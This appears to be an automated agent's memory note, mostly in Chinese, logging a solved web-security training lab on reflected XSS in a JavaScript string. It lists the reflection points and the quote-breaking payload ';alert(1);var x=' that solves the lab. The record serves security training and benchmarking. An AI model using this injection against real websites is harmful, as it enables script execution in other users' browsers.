---
metadata:
  node_type: memory
name: "PRS arm A lab-javascript-string-angle-brackets-html-encoded"
description: "arm A 基线:lab-javascript-string-angle-brackets-html-encoded 冷实例一次通过 - 单引号破 JS 串 ';alert(1);var x=' 即 solved,无 exploit server"
last_updated: 2026-10-09T07:03:13+08:00
created: 2026-10-09T07:03:13+08:00
---

## 2026-10-09 arm A baseline: lab-javascript-string-angle-brackets-html-encoded

- 场景:reflected XSS 进 search query tracking 的 JS 字符串,尖括号 HTML 编码。
- 实例:range_launch launch-url `/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded`(jar /tmp/cj1.json)一次起实例,reused:false,instance 0acb0083038cce80834814c3008a000a,exploit_server:null(无 exploit server,不需要交付面)。
- 反射点(http_dump `/ ?search=XYZTEST` 落盘 + text_grep 定位):两处回显
  - `<h1>0 search results for 'XYZTEST'</h1>`
  - `<script> var searchTerms = 'XYZTEST'; document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">'); </script>`
- 编码面:尖括号被 HTML 编码,单引号不被编码 ⇒ 单引号直接破串即可,无需 `<`/`>`。
- 载荷(URL 编码):`?search=%27%3Balert(1)%3Bvar%20x%3D%27` 即 `';alert(1);var x='`。
- 结果:page_alert fired=true(alerts:["alert:1"]);banner_verdict 首页即 `Congratulations, you solved the lab!`,solved:true(该题首页横幅跟随,无终页延迟)。
- 用时:4 件调用(launch-url → http_dump → page_alert → banner_verdict),一次通过。

